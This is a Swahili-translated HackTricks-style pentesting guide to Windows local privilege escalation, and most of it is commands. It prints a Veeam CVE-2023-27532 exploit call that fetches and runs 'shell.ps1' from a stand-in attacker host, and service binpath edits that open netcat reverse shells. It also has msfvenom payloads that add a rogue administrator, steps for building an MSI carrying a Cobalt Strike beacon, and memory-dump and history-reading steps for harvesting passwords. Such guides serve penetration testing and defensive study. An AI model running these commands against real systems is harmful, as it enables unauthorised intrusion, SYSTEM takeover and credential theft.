# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Chombo bora cha kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Mwanzo ya Windows

### Access Tokens

**Ikiwa haujui ni nini Windows Access Tokens, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa habari zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa haujui ni nini integrity levels katika Windows, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Dhibiti za Usalama za Windows

Kuna mambo tofauti ndani ya Windows ambayo yanaweza kukuzuia **kutoka ku-enumerate mfumo**, kuendesha executables au hata **kubaini shughuli zako**. Unapaswa **kusoma** ukurasa ufuatao na **ku-enumerate** mifumo yote ya **defenses mechanisms** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` yanaweza kutumiwa kufikia High IL bila prompts wakati AppInfo secure-path checks zimepitiwa. Angalia workflow maalum ya UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## Taarifa za Mfumo

### Version info enumeration

Angalia kama version ya Windows ina udhaifu unaojulikana (angalia pia patches zilizotumika).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits za toleo

Hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu wa usalama 4,700, ikionyesha **eneo kubwa la mashambulizi** ambalo mazingira ya Windows yanatoa.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas imejumuisha watson)_

**Kwenye kompyuta kwa taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info iliyohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za Transkripti za PowerShell

Unaweza kujifunza jinsi ya kuiwasha katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline za PowerShell yanarekodiwa, yakijumuisha amri zilizotekelezwa, miito ya amri, na sehemu za script. Hata hivyo, maelezo kamili ya utekelezaji na matokeo huenda yasirekodiwe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwa PowersShell logs, unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na yaliyomo yote ya execution ya script inafanywa, ikihakikisha kuwa kila block of code inarekodiwa wakati inapoendeshwa. Mchakato huu unahifadhi audit trail mpana wa kila tukio, unaofaa kwa forensics na kwa uchambuzi wa malicious behavior. Kwa kurekodi shughuli zote wakati wa execution, hupatikana ufahamu wa kina kuhusu mchakato.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logging events za Script Block zinaweza kupatikana ndani ya Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza compromise mfumo ikiwa masasisho hayataombwa kwa kutumia http**S** bali http.

Unaanza kwa kuangalia kama mtandao unatumia non-SSL WSUS update kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa utapokea jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kama hivyo, **it is exploitable.** Ikiwa registry ya mwisho iko sawa na `0`, basi entry ya WSUS itakataliwa.

Ili ku-exploit udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni MiTM weaponized exploits scripts zinazoweza kuingiza 'fake' updates katika trafiki ya WSUS isiyo-SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kimsingi, hii ndiyo dosari ambayo bug hii inaitumia:

> Ikiwa tuna uwezo wa kubadilisha proxy ya mtumiaji wetu wa eneo, na Windows Updates inatumia proxy iliyowekwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) kwa ndani ili kukamata trafiki yetu wenyewe na kuendesha code kama mtumiaji aliye na viwango vya juu kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS inatumia mipangilio ya mtumiaji wa sasa, itatumia pia certificate store yake. Ikiwa tutatengeneza self-signed certificate kwa hostname ya WSUS na kuingiza cheti hiki kwenye certificate store ya mtumiaji wa sasa, tutaweza kukamata trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mechanisms kama HSTS kutekeleza uthibitisho wa trust-on-first-use kwa cheti. Ikiwa cheti kilichowasilishwa kinatambulika na mtumiaji na kina hostname sahihi, kitabaliwa na huduma.

Unaweza ku-exploit udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapopatikana).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa enterprise huweka uso wa IPC kwenye localhost na channel ya update yenye ruhusa za juu. Ikiwa enrollment inaweza kusukumwa kwa server ya mshambuliaji na updater ikimtumaini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI yenye madhara ambayo service ya SYSTEM itaweka. Angalia mbinu ya jumla (inayotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` inaweka huduma ya localhost kwenye **TCP/9401** inayoshughulikia ujumbe unaodhibitiwa na mshambuliaji, ikiruhusu amri za aina yoyote kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na version, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory ile ile, kisha zindua SYSTEM payload kupitia socket ya localhost:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma inatekeleza amri kama SYSTEM.

## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya ni pamoja na mazingira ambapo **LDAP signing is not enforced,** watumiaji wana **self-rights** zinazowawezesha kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba haya **mahitaji** yanatimizwa kwa kutumia **mipangilio ya chaguo-msingi**.

Tafuta **exploit** katika [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa attack, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** rejista hizi 2 ziko **zimeamilishwa** (thamani ni **0x1**), basi watumiaji wa ruhusa yoyote wanaweza **sakinisha** (tekeleza) `*.msi` faili kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kuendesha kiotomatiki mbinu hii kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up kutengeneza ndani ya saraka ya sasa kifaili cha MSI cha Windows ili kuongeza hadhi za mtumiaji. Skripti hii inaandika MSI installer iliyotayarishwa kabla inayouliza kuongeza mtumiaji/kikundi (kwa hivyo utahitaji ufikiaji wa GIU):
```
Write-UserAddMSI
```
Tumia tu binary iliyotengenezwa ili kupandisha ruhusa.

### MSI Wrapper

Soma mafunzo haya ili kujifunza jinsi ya kuunda MSI wrapper ukitumia zana hizi. Kumbuka unaweza kuzungusha faili ya "**.bat**" ikiwa unataka **tu** **tekeleza** **mistari ya amri**

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Mpa mradi jina, like **AlwaysPrivesc**, tumia **`C:\privesc`** for the location, chagua **place solution and project in the same directory**, and click **Create**.
- Endelea kubonyeza **Next** until you get to step 3 of 4 (choose files to include). Bonyeza **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Chagua the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, badilisha **TargetPlatform** kutoka **x86** to **x64**.
- Kuna properties nyingine unaweza kubadilisha, such as the **Author** and **Manufacturer** ambazo zinaweza kufanya the installed app ionekane halali zaidi.
- Bofya mara ya kulia the project and select **View > Custom Actions**.
- Bofya mara ya kulia **Install** and select **Add Custom Action**.
- Bonyeza mara mbili kwenye **Application Folder**, chagua your **beacon.exe** file and click **OK**. Hii itahakikisha kuwa the beacon payload inatekelezwa mara tu the installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** to **True**.
- Mwisho, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

Ili kutekeleza **ufungaji** wa faili ya `.msi` ya hasidi kwa **usuli:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vichunguzi

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua ni nini kinachorekodiwa (**logged**), hivyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, inavutia kujua wapi logs zinatumwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya usimamizi wa local Administrator passwords, ikihakikisha kwamba kila moja ni ya kipekee, iliyopangwa kwa nasibu, na inasasishwa mara kwa mara kwenye kompyuta zilizojiunga na domain. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, kuwapa uwezo wa kuona local admin passwords ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa iko hai, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**Taarifa zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia na **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **block** jaribio za michakato isiyoaminika za **read its memory** au **inject code**, na kuboresha zaidi usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Lengo lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** zinathibitishwa na **Local Security Authority** (LSA) na zinatumiwa na vipengele vya mfumo wa uendeshaji. Wakati data za kuingia za mtumiaji zinathibitishwa na kifurushi cha usalama kilichosajiliwa, domain credentials kwa mtumiaji kwa kawaida huanzishwa.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa mojawapo ya vikundi unavyojiunga navyo lina ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Makundi yenye ruhusa za juu

Ikiwa **unapatikana katika kundi fulani lenye ruhusa za juu, unaweza kuweza kuongeza vipaumbele**. Jifunze kuhusu makundi yenye ruhusa za juu na jinsi ya kuyatumia mabaya ili kuongeza vipaumbele hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu ni nini **token** kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu tokens zenye kuvutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nenosiri
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato zinazoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unaporodhesha michakato, angalia **nywila ndani ya mstari wa amri wa mchakato**.\
Angalia kama unaweza **kuandika juu ya binary inayotekelezwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kuweza kutumia [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** zikiendesha, unaweza kuzitumia ili escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za faili za binary za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kuangalia ruhusa za folda za binaries za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda memory dump ya mchakato unaoendelea ukitumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials in clear text in memory**, jaribu kufanya dump ya memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazokimbia kama SYSTEM zinaweza kumruhusu mtumiaji kuanzisha CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Services

Service Triggers zinamwezesha Windows kuanzisha service wakati masharti fulani yanapotokea (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanzisha services zenye uwezo wa juu kwa kuwasha triggers zao. Tazama mbinu za kuorodhesha na kuanzisha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.
```bash
sc qc <service_name>
```
Inashauriwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia kama "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe kwa XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Kuwezesha huduma

Ikiwa unapata kosa hili (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Chukua kuwa huduma upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia mbadala nyingine ya kutatua tatizo hili ni kuendesha:**
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika senario ambapo kikundi cha "Authenticated users" kinayo **SERVICE_ALL_ACCESS** kwa huduma, inawezekana kubadilisha binary inayotekelezwa ya huduma. Ili kubadilisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ruhusa zinaweza kuinuliwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kurekebisha service binary.
- **WRITE_DAC**: Inawezesha upya usanidi wa ruhusa, na hivyo uwezo wa kubadilisha service configurations.
- **WRITE_OWNER**: Inaruhusu kupata umiliki na upya usanidi wa ruhusa.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha service configurations.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha service configurations.

Kwa ugundaji na exploitation ya udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Services binaries weak permissions

**Angalia kama unaweza kubadilisha binary inayotekelezwa na service** au ikiwa una **write permissions on the folder** ambapo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (not in system32) na kukagua ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha Services registry

Unapaswa kukagua kama unaweza kubadilisha service registry yoyote.\
Unaweza **kukagua** **ruhusa zako** juu ya service **registry** kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuangaliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndiyo, binary inayotekelezwa na huduma inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

Ikiwa una idhini hii juu ya registry hii inamaanisha **unaweza kuunda sub-registries kutoka kwa hii**. Katika kesi ya Windows services hii ni **ya kutosha kutekeleza arbitrary code:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haiko ndani ya nukuu, Windows itajaribu kutekeleza kila mwisho kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha unquoted service paths zote, isipokuwa zile zinazomilikiwa na built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na exploit** hii vulnerability kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kwa mkono kuunda service binary kwa kutumia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejesho

Windows inaruhusu watumiaji kutaja hatua zitakazochukuliwa ikiwa service itashindwa. Kipengele hiki kinaweza kusanidiwa kuonyesha binary. Ikiwa binary hii inaweza kubadilishwa, inaweza kuwa inawezekana kupata privilege escalation. Maelezo zaidi yanaweza kupatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu Zilizowekwa

Angalia **permissions of the binaries** (labda unaweza overwrite moja na kupata privilege escalation) na **permissions za folda** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
